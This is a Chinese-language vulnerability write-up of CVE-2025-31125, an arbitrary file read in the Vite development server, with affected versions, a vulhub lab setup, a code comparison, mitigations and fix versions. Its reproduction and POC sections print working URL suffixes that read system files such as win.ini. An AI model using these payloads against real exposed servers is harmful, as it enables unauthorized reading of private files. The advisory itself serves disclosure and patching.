# 1、漏洞信息

Vite是一个现代化的前端构建工具，旨在提供更快的开发体验。它通过基于原生ES模块的开发服务器，在开发过程中实现极速热更新（HMR）。Vite在构建时使用了高度优化的打包工具，如esbuild，极大提高了构建速度。它支持多种前端框架（如React、Vue）并可以通过插件扩展功能。Vite的目标是简化前端开发工作流，并提升开发效率。



攻击者可以通过`?inline&import`或`?raw?import`参数获取经过`base64`编码的非授权文件内容。该漏洞仅在开发服务器通过`--host`或`server.host`配置暴露至网络时，才可能被利用。



# 2、漏洞概述

| 漏洞名称  | 任意文件读取漏洞                                |
| --------- | ----------------------------------------------- |
| 漏洞等级  | 中危                                            |
| CVE编号   | CVE-2025-31125                                  |
| CNVD编号  | 暂无                                            |
| CNNVD编号 | 暂无                                            |
| 其他编号  | 暂无                                            |
| 披露时间  | 2025-03-31                                      |
| 分数      | 5.3                                             |
| CVSS      | CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N    |
| 披露链接  | https://www.cve.org/CVERecord?id=CVE-2025-31125 |



# 3、影响范围

```
6.2.0 <= Vite <= 6.2.3
6.1.0 <= Vite <= 6.1.2
6.0.0 <= Vite <= 6.0.12
5.0.0 <= Vite <= 5.4.15
Vite <= 4.5.10
```



# 4、环境搭建

此环境为CVE-2025-30208的漏洞环境，但是适用于CVE-2025-31125。

```
git clone --depth 1 https://github.com/vulhub/vulhub.git
cd /opt/vulhub/vite/CVE-2025-30208/
docker compose up -d
```



# 5、代码审计

```
/@fs/C:/windows/win.ini?import&inline=1.wasm?init
```

- `?inline`作用是将文件（如图片、字体、WASM 等）的内容转换为Base64 编码字符串或直接嵌入到`JS/HTML/CSS`中，避免额外的 HTTP 请求。
- `?init`主要用于 WebAssembly（`.wasm`）文件的初始化，默认只有`.wasm`支持`?init`其他如`.data`、`.bin`可以通过插件拓展支持。

![image-20250427150707864](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202504271507954.png)



对比v6.2.3和v6.2.4增加了三条正则的匹配，这意味着只要url存在这些参数都会进入到`ensureServingAccess`函数中

```
const urlRE = /[?&]url\b/
const rawRE = /[?&]raw\b/
const inlineRE = /[?&]inline\b/
```

![image-20250427150815737](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202504271508845.png)



# 6、漏洞复现

将POC附加到 URL，可以绕过此限制并检索文件的内容

```
?raw?import
?inline&import
?import&inline=1.wasm?init
```

![image-20250427154653584](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202504271548588.png)



Base64解码

![image-20250427151724402](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202504271517490.png)



# 7、解决方案

## 7.1、临时缓解方案

如果暂时无法升级，可以采取以下措施降低风险：

限制网络访问：避免使用 `--host` 或设置 `server.host` 为 `localhost`，确保开发服务器仅限本地访问。

严格文件权限：确保敏感文件不可被 Vite 进程读取（例如通过操作系统权限控制）。



## 7.2、升级修复方案

Vite 官方已发布安全补丁，修复版本包括：

```
Vite >= 6.2.4
6.1.3 <= Vite < 6.2.0
6.0.13 <= Vite < 6.1.0
5.4.16 <= Vite < 6.0.0
4.5.11 <= Vite < 5.0.0
```

请尽快通过 `npm update vite` 或手动升级到以上版本以修复漏洞。



# 8、POC

```
?raw?import
?inline&import
?import&inline=1.wasm?init
```



# 9、参考链接

https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949

https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8







